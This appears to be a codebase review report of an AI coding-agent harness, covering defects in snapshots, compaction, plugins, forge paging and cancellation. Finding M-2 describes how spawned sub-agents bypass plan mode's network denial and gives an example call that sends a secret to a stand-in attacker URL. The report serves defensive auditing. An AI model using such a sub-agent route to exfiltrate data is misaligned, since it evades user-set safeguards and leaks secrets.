# Full codebase review — 2026-07-21

**Scope:** everything except `interfaces/` and `server/` — ~24k LOC of source across
`runtime/`, `tools/`, `session/` + `compaction.py` + `jobs.py`, `subagents/` + `workflows/`,
`workspace/` + `hooks/` + `plugins/`, and `config/` + `mcp/` + `lsp/` + `forge/` + root
modules, plus their tests (~52k LOC). Each area was read in full by a dedicated reviewer;
quality gates were run independently: **ruff clean, pyright 0 errors, test suite green at
93.5% coverage** — except one failing test in the uncommitted compaction working-tree
changes (finding S-4/W-1 below).

## Overall grade: 8/10

| Subsystem | Grade | Headline |
|---|---|---|
| `runtime/` (harness, controller, builder) | 9 | No major findings; invariants enforced and tested |
| `subagents/` + `workflows/` | 8.5 | Minors only; Monty abort invariant honored exactly |
| `tools/` + impl layer | 8 | One security-boundary gap (plan-mode egress) |
| `session/` + compaction + jobs | 8 | Two behavioral bugs in newer glue |
| `workspace/` + hooks + plugins | 8 | One verified data-loss bug in rewind |
| config / mcp / lsp / forge / misc | 8 | One live forge paging bug |

**Why 8:** the two hardest invariants — never persist a history ending in an unanswered
tool call, never persist dirty mid-approval state — are enforced in few places, defended
by accurate load-bearing comments, and pinned by tests targeting the exact failure
scenarios. The security posture is real engineering: SSRF defense with DNS-rebind
pinning, symlink-safe path guards, a fail-closed centralized trust predicate that is
cache-poisoning-aware, hardened plugin install, and an env blocklist that closes the
XDG-redirect hole. What holds it back: five verified major defects — including one
data-loss path and one security-boundary bypass — sharing a pattern: each lives in a
corner where the test suite encoded an idealized model of the world (a server that honors
any page limit, an index without force-added files, a token measurement that only grows).

---

## Major findings (fix-first order)

### M-1. Data loss on rewind — `workspace/snapshot.py:156` + `:219-247`
Tracked-but-gitignored files (`git add -f`'d `.env`-style files) are skipped by the
snapshot's `git add -A` against the throwaway index, but included by `_present_files()`
(real index via `ls-files`) — so restore classifies them as "extra" and **deletes them
from disk**. Verified empirically. The existing test
(`test_restore_does_not_delete_a_file_ignored_at_capture`) covers only the
untracked-ignored case.

### M-2. Plan-mode egress bypass via sub-agents — `workspace/agents.py:305-311` + spawn registration
Plan mode deliberately denies `fetch_url`/`web_search` on the main agent
(`runtime/permissions.py`, tested), but `spawn_agent` is ungated and
`effective_tools(defn, allow_gated=…)` only strips `GATED_TOOLS`, never `NET_TOOLS`.
Sub-agents register net tools plain. In plan mode,
`spawn_agent(type="explore", task="fetch https://attacker/?x=<secret>")` executes
`fetch_url` with zero approval and zero plan-mode denial — defeating the exact
exfiltration boundary `_plan_decision` implements. No test covers spawned-sub-agent
egress.

### M-3. Forge PR lookup breaks past ~50 PRs — `forge/tea_backend.py:168-185`
`_find_pr` terminates on `len(prs) < limit`, but Gitea clamps page size to
`api.MAX_RESPONSE_ITEMS` (default 50); the doubling-limit loop refetches the same capped
50 and reports older PRs "not found" (this repo is at PR #69 — likely live today).
`ci_status` for those branches degrades to "unknown". The covering test stubs a server
honoring arbitrary limits. Fix: page with `--page` and a fixed size, terminate on an
empty page.

### M-4. Spurious double compaction — `session/ctrl.py:471-474` / `517-524`
`last_input_tokens` is not reset after a compaction fires, so the next turn gates on the
stale pre-compaction measurement (`max(~30k estimate, 120k stale) > threshold`) and can
re-summarize the summary — losing detail, breaking prompt cache, firing PreCompact again,
and re-invalidating checkpoints. Fix: clear the measurement whenever `compacted` is true.

### M-5. Swallowed cancellation in `JobRegistry.wait` — `jobs.py:246-255`
`except asyncio.CancelledError: pass` cannot distinguish "the job's task was cancelled"
from "the waiter itself was cancelled" — a Ctrl-C/Esc delivered while the model is inside
`wait_for_job` is silently eaten, the wake is consumed, and the turn keeps running.
`await_settled` (lines 303-309) already disambiguates via `job.task.cancelled()` and
re-raises; mirror it.

---

## Working-tree (uncommitted compaction changes)

- **W-1 (failing test).** `test_mask_persist_puts_path_in_placeholder` fails: masking
  iterates newest-first, so the oldest history entry receives the last-persisted file
  (`004-…`) instead of `001-…` — persist-call order doesn't match history order.
- **W-2.** The new `persist=` seam of `mask_stale_observations` has no production caller
  (ctrl.py and both sub-agent call sites still call without `persist`) — inert as shipped.
- **W-3.** `persist(str(part.content), …)` serializes structured tool returns as Python
  repr, not JSON, despite the "exact bytes" docstring promise.
- **W-4.** The scratchpad target is deleted with the session (`store.py:474-477`); a
  resumed session can carry pointer placeholders to files that no longer exist, and the
  placeholder text does not warn about it.
- **W-5 (nit).** `will_compact` gates on the estimate alone (no `measured_tokens`), so it
  no longer predicts `maybe_compact`'s decision.

---

## Minor findings

### tools/
- `impl/fs.py:130` — `read_file` decodes with the platform locale encoding (no
  `encoding=`), while `edit_file` and grep force UTF-8: on non-UTF-8 locales the model
  edits against a view that disagrees with what `edit_file` reads.
- `impl/shell.py:370` — background bash offload key is the command string only (unlike
  `run_bash`, which folds in timeout/stdin per its own collision comment): two background
  jobs with identical commands can cross-contaminate spilled output files.
- `impl/fs.py:463-485` (nit) — grep reads non-binary files fully into memory; the only
  unbounded-input read path left in the file tools.
- `read_only_commands.py` (nit) — `grep`/`ack` sit in the bare allowlist with no arg
  screener; safe today, worth a comment pinning the assumption. Also `find` appears in
  `_ALLOWED_PROGRAMS` despite the screener comment's invariant that screener-owned
  programs must stay absent (dead entry, false invariant).

### session / jobs
- `ctrl.py:290-295` — the persist worker thread passes the *live* `deps.tasks`/`deps.jobs`
  collections to `store.save`; concurrent `register()`/`clear_history()` can raise
  "dictionary changed size during iteration" and fail the persist; a mid-iteration settle
  can produce a torn entry.
- `checkpoints.py:159-165` — switching sessions while an undo window is open orphans the
  pre-rewind stash refs (and `_pre_restore` ref): the sidecar is saved without them and
  only full session `delete()` reaps the namespace — untracked-file snapshots (potentially
  secrets) stay pinned in `.git` indefinitely.
- `ctrl.py:404-413` (nit) — `SessionController.reset()`/`new_session()` clear tasks but
  not job history; embedders driving the controller directly leak settled jobs into the
  new session's file.

### workspace / hooks / plugins
- `memory.py:106-134` — a title containing a markdown link defeats index upsert dedup
  (duplicate lines; a later save for a colliding slug can clobber the wrong entry).
- `memory.py:148,157` + `tools/memory_tools.py:39` — `save_memory` propagates `OSError`
  (read-only `.marim/`) into the turn despite the module's "never raises" contract —
  `remember` becomes turn-killing.
- `plugins/discovery.py` + `agents.py` — agent defs are classified "inert" but can carry
  `tools: bash` (ungated on spawn in auto mode) and `backend: claude-cli`;
  `has_executable` counts only hooks/MCP, so such a plugin is auto-trusted at install
  with an understated trust summary.
- `plugins/discovery.py:125-142` — a hostile repo can name-shadow a user's *global*
  plugin out of existence without trust (integrity/DoS degradation, no elevation).
- `install.py:304-305` — trust survives a git update that *changes* an existing hook's
  command; only presence-elevation (inert → executable) drops `trusted`.
- `snapshot.py:227-235` — `_remove_extra_files` follows symlinks in `is_dir()`: an extra
  symlink-to-directory is misclassified as a nested repo, skipped, and restore still
  reports success (silently incomplete rewind).
- Nits: `install.py:285` bare `KeyError` on a `type: git` registry entry without `url`;
  `memory.py:94-103` unescaped `description` can produce unparseable YAML frontmatter;
  `skills.py:258` `read_bundled_file` lacks `encoding="utf-8"`.

### config / mcp / lsp / forge / misc
- `config/persist.py:22-31` — values containing a literal newline are written across two
  physical lines; the line-based updater later orphans the continuation as junk in the
  global `.env`.
- `config/openrouter_cost.py:134-154` — the MiniMax orphan-tag scrubber never flushes its
  final carry at end of stream; a response ending in a tag prefix loses those characters.
- `mcp/config.py:171-189` — `persist_server_enabled` writes to the project `mcp.json`
  without checking trust: disabling a global server whose name an untrusted project file
  shadows lands the toggle in the never-loaded file — the disable silently doesn't stick.
- `lsp/basedpyright.py:144-155` — `yield self` not wrapped in try/finally; exceptional
  teardown can orphan the basedpyright process.
- `config/claude_cli_model.py:644` — `self._ts` stamped once at construction; every
  persisted response shares one timestamp. Nit: line 182 truncates micro-USD where
  openrouter_cost rounds.
- Nits: `usage.py:113-118` first-`:` split mis-handles Ollama-style tagged ids (comment
  contradicts `context_limits._bare_id`); `notifications.py:55-61` unknown-events value
  falls back to DEFAULT_EVENTS (typo re-enables everything); `images.py:126-132` cache at
  `~/.marim/image-cache` ignores the XDG convention and is never garbage-collected.

### runtime/
- `ttft.py:58-63` — UI callback in a `finally` unguarded; a raising TUI callback can
  replace an in-flight `CancelledError` with a spurious run failure.
- `context.py:43-55` — `strip_turn_context`'s `rfind` anchor loses the head of typed text
  that itself contains the separator (display-only, docstring overclaims).
- `controller.py:472-474` — an actionable error note is consumed at assembly and lost if
  a failure occurs between assembly and `agent.run` (e.g. MCP compose raising).
- `controller.py:488-489` — UserPromptSubmit hooks receive the fully assembled prompt
  (error notes, shell output, digests), not the typed text; leaks injected context to
  third-party hook scripts, undocumented.
- Nits: dead `if deps.services` guards (`deps.services` is never `None`);
  `builder.py:407-409` sets `_built = True` before `Harness(...)` can raise; bootstrap
  builds then discards summarizer/titler on every CLI launch.

### subagents / workflows
- `runner.py:655` — a tier-routed spawn resolves its masking trigger from the *session*
  model, not the tier target: a small-window tier model never proactively masks and can
  die on overflow with only the one-shot shed.
- `cli_demux.py:218-228` — async-spawn settlement is order-dependent: if a future CLI
  emits the launch `tool_result` before `task_started`, the card settles with launch
  metadata and the real notification is dropped.
- `workflows/engine.py:407,419` — a failing spill write on the success path escapes after
  the run began but before `_announce_done`; the workflow card is left "running" forever.
- `runner.py:666-672` — `output_schema` is not persisted to sidecar meta; a resumed
  schema'd spawn continues with `output_type=str` and no prompt contract.
- Nits: `run_background` docstring claims background reports are "not hard-capped"
  (finalize does cap them, losslessly); PreToolUse/PostToolUse hooks silently don't apply
  to `backend: claude-cli` spawn tool calls — undocumented at the seam.

---

## Strengths (converged across reviewers)

- **Resumability enforced, not documented**: dual sanitizer pass with load-bearing
  ordering, never-persist-dirty-history across the approval loop, identity-based
  no-change returns; metadata writers patch headers precisely to preserve the invariant.
- **Failure-path engineering**: enum-keyed one-shot retry latches, usage banked from
  failed rounds, KV-contention vs genuine-overflow classification, deadline-bounded
  resumable flush that lets `CancelledError` propagate.
- **Security posture**: SSRF pinning (resolve-once, connect-to-validated-IP, redirect
  re-pinning, IPv4-mapped-IPv6 normalization), symlink-safe path guards, fail-closed
  centralized trust predicate with cache-poisoning-aware discovery caches, plugin install
  hardening (`GIT_ALLOW_PROTOCOL`, leading-dash rejection, traversal-name rejection,
  linked-plugin trust revocation), project-env blocklist closing the XDG redirect hole.
- **Data safety**: atomic+fsynced writes with advisory locking, load-into-locals session
  switching, refusal-over-destruction rewind with safety snapshots and single-level undo.
- **External-process discipline**: claude-cli stream invariants (multi-result streams,
  last-DoneChunk-wins, `__cli_error__` sentinel, kill-in-finally), Monty VM
  never-cancelled abort protocol, single-flight LSP startup with dead-server eviction.
- **Architecture honesty**: the documented pure/effectful/wiring split and
  builder-vs-bootstrap seam are actually followed; model-facing tool docstrings encode
  real failure modes; why-comment culture matches CLAUDE.md's promise.

## Coverage assessment

Adversarial and strong where it matters (SSRF ranges, symlink escapes, sanitizers, retry
latches, rewind matrix ~40 tests, CLI stream edges, trust gates, plugin security suite).
Every major defect above lives in an untested corner whose test encoded an idealized
external world — the recurring lesson is to test against the real contract (Gitea's page
cap, git's force-added-ignored index state, locale encodings, cancellation delivery).
